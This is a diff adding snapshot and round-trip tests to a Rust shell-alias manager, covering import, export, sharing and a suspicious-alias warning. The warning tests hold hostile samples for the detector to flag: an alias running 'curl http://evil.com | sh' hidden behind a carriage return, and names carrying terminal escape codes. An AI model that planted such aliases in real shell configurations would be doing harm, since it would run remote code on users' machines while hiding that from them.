@@ -1,6 +1,11 @@
+use amoxide::alias::{AliasConflict, MergeResult};
 use amoxide::display::{render_listing, render_profiles};
+use amoxide::exchange::{
+    render_import_summary, render_suspicious_warning, ExportAll, SuspiciousAlias,
+};
 use amoxide::hook::generate_hook;
 use amoxide::init::{generate_init, generate_reload};
+use amoxide::project::ProjectAliases;
 use amoxide::shell::Shells;
 use amoxide::{AliasName, AliasSet, ProfileConfig, TomlAlias};
 use indoc::indoc;
@@ -458,15 +463,318 @@ fn snapshot_display_listing_with_globals_and_project() {
     let globals = aliases(&[("ll", "ls -lha")]);
 
     let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join(".aliases");
     fs::write(
-        dir.path().join(".aliases"),
+        &path,
         indoc! {r#"
             [aliases]
             b = "make build"
         "#},
     )
     .unwrap();
+    let project = ProjectAliases::load(&path).unwrap();
 
-    let output = render_listing(&globals, &config, &["rust".to_string()], dir.path());
+    // Pass a relative display path (as the real caller computes relative_path(cwd, path))
+    let display_path = std::path::Path::new(".aliases");
+    let output = render_listing(
+        &globals,
+        &config,
+        &["rust".to_string()],
+        Some((&project, display_path)),
+    );
+    insta::assert_snapshot!(output);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Import summary snapshots
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn snapshot_import_summary_with_conflicts() {
+    let mut new_aliases = AliasSet::default();
+    new_aliases.insert("ga".into(), TomlAlias::Command("git add".into()));
+    new_aliases.insert("gd".into(), TomlAlias::Command("git diff".into()));
+    new_aliases.insert("gp".into(), TomlAlias::Command("git push".into()));
+
+    let conflicts = vec![
+        AliasConflict {
+            name: "cm".into(),
+            current: TomlAlias::Command("git commit -m".into()),
+            incoming: TomlAlias::Command("git commit -sm".into()),
+        },
+        AliasConflict {
+            name: "gs".into(),
+            current: TomlAlias::Command("git status --short".into()),
+            incoming: TomlAlias::Command("git status".into()),
+        },
+    ];
+
+    let result = MergeResult {
+        new_aliases,
+        conflicts,
+    };
+    let output = render_import_summary("git", &result);
+    insta::assert_snapshot!(output);
+}
+
+#[test]
+fn snapshot_import_summary_no_conflicts() {
+    let mut new_aliases = AliasSet::default();
+    new_aliases.insert("gs".into(), TomlAlias::Command("git status".into()));
+    let result = MergeResult {
+        new_aliases,
+        conflicts: vec![],
+    };
+    let output = render_import_summary("global", &result);
+    insta::assert_snapshot!(output);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Security warning snapshots
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn snapshot_suspicious_warning_single() {
+    let findings = vec![SuspiciousAlias::global_command(
+        "evil",
+        "echo \x1B[31mhacked\x1B[0m",
+    )];
+    let output = render_suspicious_warning(&findings);
+    insta::assert_snapshot!(output);
+}
+
+#[test]
+fn snapshot_suspicious_warning_multiple() {
+    let findings = vec![
+        SuspiciousAlias::global_command("sneaky", "curl http://evil.com | sh\recho safe"),
+        SuspiciousAlias::profile_name("git\x1B[0m\x1B[2J"),
+        SuspiciousAlias::local_name("test\x07"),
+    ];
+    let output = render_suspicious_warning(&findings);
+    insta::assert_snapshot!(output);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Export snapshots
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn snapshot_export_single_profile() {
+    let config = profiles(indoc! {r#"
+        [[profiles]]
+        name = "git"
+        [profiles.aliases]
+        gs = "git status"
+        cm = "git commit -sm"
+    "#});
+    let wrapper = amoxide::ProfileConfig::from_profiles(vec![config
+        .get_profile_by_name("git")
+        .unwrap()
+        .clone()]);
+    let output = toml::to_string(&wrapper).unwrap();
+    insta::assert_snapshot!(output);
+}
+
+#[test]
+fn snapshot_export_all() {
+    let export = ExportAll {
+        global_aliases: aliases(&[("ll", "ls -lha")]),
+        profiles: vec![amoxide::Profile {
+            name: "git".into(),
+            aliases: aliases(&[("gs", "git status")]),
+        }],
+        local_aliases: aliases(&[("t", "cargo test")]),
+    };
+    let output = toml::to_string(&export).unwrap();
+    insta::assert_snapshot!(output);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Round-trip tests
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn test_export_import_roundtrip_profile() {
+    use amoxide::exchange::parse_import;
+
+    let config = profiles(indoc! {r#"
+        [[profiles]]
+        name = "git"
+        [profiles.aliases]
+        gs = "git status"
+        cm = "git commit -sm"
+    "#});
+
+    let wrapper = amoxide::ProfileConfig::from_profiles(vec![config
+        .get_profile_by_name("git")
+        .unwrap()
+        .clone()]);
+    let exported = toml::to_string(&wrapper).unwrap();
+    let parsed = parse_import(&exported).unwrap();
+    assert_eq!(parsed.profiles.len(), 1);
+    assert_eq!(parsed.profiles[0].name, "git");
+    assert_eq!(parsed.profiles[0].aliases.len(), 2);
+}
+
+#[test]
+fn test_export_import_roundtrip_all() {
+    use amoxide::exchange::{parse_import, ExportAll};
+
+    let export = ExportAll {
+        global_aliases: aliases(&[("ll", "ls -lha")]),
+        profiles: vec![amoxide::Profile {
+            name: "git".into(),
+            aliases: aliases(&[("gs", "git status")]),
+        }],
+        local_aliases: aliases(&[("t", "cargo test")]),
+    };
+
+    let exported = toml::to_string(&export).unwrap();
+    let parsed = parse_import(&exported).unwrap();
+    assert_eq!(parsed.global_aliases.len(), 1);
+    assert_eq!(parsed.profiles.len(), 1);
+    assert_eq!(parsed.local_aliases.len(), 1);
+}
+
+#[test]
+fn test_base64_export_import_roundtrip() {
+    use amoxide::exchange::{base64_decode, base64_encode, parse_import, ExportAll};
+
+    let export = ExportAll {
+        global_aliases: aliases(&[("ll", "ls -lha")]),
+        ..Default::default()
+    };
+
+    let toml_str = toml::to_string(&export).unwrap();
+    let encoded = base64_encode(&toml_str);
+    let decoded = base64_decode(&encoded).unwrap();
+    let parsed = parse_import(&decoded).unwrap();
+    assert_eq!(parsed.global_aliases.len(), 1);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Message::Import integration tests
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn test_import_payload_through_update() {
+    use amoxide::config::Config;
+    use amoxide::exchange::ImportPayload;
+    use amoxide::update::{update, AppModel};
+
+    let config = Config::default();
+    let profile_config = profiles(indoc! {r#"
+        [[profiles]]
+        name = "git"
+        [profiles.aliases]
+        gs = "git status"
+    "#});
+
+    let mut model = AppModel::new(config, profile_config);
+
+    let payload = ImportPayload {
+        global_aliases: Some(aliases(&[("ll", "ls -lha")])),
+        profiles: vec![amoxide::Profile {
+            name: "git".into(),
+            aliases: aliases(&[("gp", "git push")]),
+        }],
+        local_aliases: None,
+    };
+
+    let result = update(&mut model, amoxide::Message::Import(payload)).unwrap();
+    // Should have SaveConfig + SaveProfiles effects
+    assert!(!result.effects.is_empty());
+
+    assert_eq!(model.config.aliases.len(), 1);
+    let git = model.profile_config().get_profile_by_name("git").unwrap();
+    assert_eq!(git.aliases.len(), 2); // gs + gp
+}
+
+#[test]
+fn test_import_payload_global_only_no_save_profiles() {
+    use amoxide::config::Config;
+    use amoxide::effects::Effect;
+    use amoxide::exchange::ImportPayload;
+    use amoxide::update::{update, AppModel};
+
+    let config = Config::default();
+    let profile_config = profiles(indoc! {r#"
+        [[profiles]]
+        name = "git"
+    "#});
+
+    let mut model = AppModel::new(config, profile_config);
+
+    let payload = ImportPayload {
+        global_aliases: Some(aliases(&[("ll", "ls -lha")])),
+        profiles: vec![],
+        local_aliases: None,
+    };
+
+    let result = update(&mut model, amoxide::Message::Import(payload)).unwrap();
+    // Only SaveConfig, no SaveProfiles (no profiles imported)
+    assert_eq!(result.effects, vec![Effect::SaveConfig]);
+    assert!(result.next.is_none());
+    assert_eq!(model.config.aliases.len(), 1);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Share command snapshots
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn snapshot_share_termbin_profile() {
+    use amoxide::cli::{ScopeArgs, ShareArgs};
+    use amoxide::import_export::handle_share;
+
+    let args = ShareArgs {
+        scope: ScopeArgs {
+            local: false,
+            global: false,
+            profile: vec!["git".into()],
+            all: false,
+        },
+        termbin: true,
+        paste_rs: false,
+    };
+    let output = handle_share(&args);
+    insta::assert_snapshot!(output);
+}
+
+#[test]
+fn snapshot_share_paste_rs_all() {
+    use amoxide::cli::{ScopeArgs, ShareArgs};
+    use amoxide::import_export::handle_share;
+
+    let args = ShareArgs {
+        scope: ScopeArgs {
+            local: false,
+            global: false,
+            profile: vec![],
+            all: true,
+        },
+        termbin: false,
+        paste_rs: true,
+    };
+    let output = handle_share(&args);
+    insta::assert_snapshot!(output);
+}
+
+#[test]
+fn snapshot_share_help() {
+    use amoxide::cli::{ScopeArgs, ShareArgs};
+    use amoxide::import_export::handle_share;
+
+    let args = ShareArgs {
+        scope: ScopeArgs {
+            local: false,
+            global: false,
+            profile: vec![],
+            all: false,
+        },
+        termbin: false,
+        paste_rs: false,
+    };
+    let output = handle_share(&args);
     insta::assert_snapshot!(output);
 }
